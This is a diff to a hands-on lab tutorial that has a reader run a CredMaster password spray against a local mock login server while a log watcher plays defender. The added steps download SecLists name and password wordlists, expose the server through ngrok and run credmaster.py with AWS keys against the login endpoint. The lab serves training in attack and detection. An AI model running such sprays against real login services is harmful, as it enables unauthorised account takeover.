@@ -47,7 +47,7 @@ Leave this running. Every login attempt will appear here in real time as CredMas
 You now have three terminals running:
 - **Terminal 1** - the mock auth server (target)
 - **Terminal 2** - the live log watcher (defender)
-- **Terminal 3** - ready for CredMaster (attacker)
+- **Terminal 3** - free
 
 
 Before running the spray we need to create an **AWS Account**, go here and make an account: https://aws.amazon.com/
@@ -81,7 +81,35 @@ Now this is REALLY IMPORTANT, save the **Access Key** and the **Secret access ke
 
 
 
-In Terminal 3, run the spray with your AWS Keys:
+In Terminal 3, let's get the credentials for our spray
+
+```bash
+sudo wget -O ~/Desktop/names.txt \
+  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt
+
+sudo wget -O ~/Desktop/top-passwords-shortlist.txt \
+  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-passwords-shortlist.txt
+```
+
+Now the last step is to make the mock server accessible to the internet with **ngrok**
+
+Finally go to: ngrok.com and make an account
+
+After making an account, navigate here: https://dashboard.ngrok.com/get-started/setup/linux and grab this command and run it in the terminal:
+
+
+
+<img width="1092" height="720" alt="2026-04-10_12-48" src="https://github.com/user-attachments/assets/e5856e02-4134-4ea2-b7d4-ed84f51f1226" />
+
+Now run:
+
+```bash
+ngrok http 5000
+```
+
+Finally open a **4th Terminal**
+
+Run the spray with your AWS Keys:
 
 ```bash
 cd ~/BnB/credMaster/CredMaster
@@ -94,8 +122,8 @@ source venv/bin/activate
 ```bash
 python3 credmaster.py \
   --plugin httppost \
-  -u /usr/share/seclists/Usernames/Names/names.txt \
-  -p /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt \
+  -u ~/Desktop/names.txt \
+  -p ~/Desktop/top-passwords-shortlist.txt \
   --access_key YOUR_AWS_KEY \
   --secret_access_key YOUR_AWS_SECRET \
   --pluginargs url http://127.0.0.1:5000/auth/login content-type json \
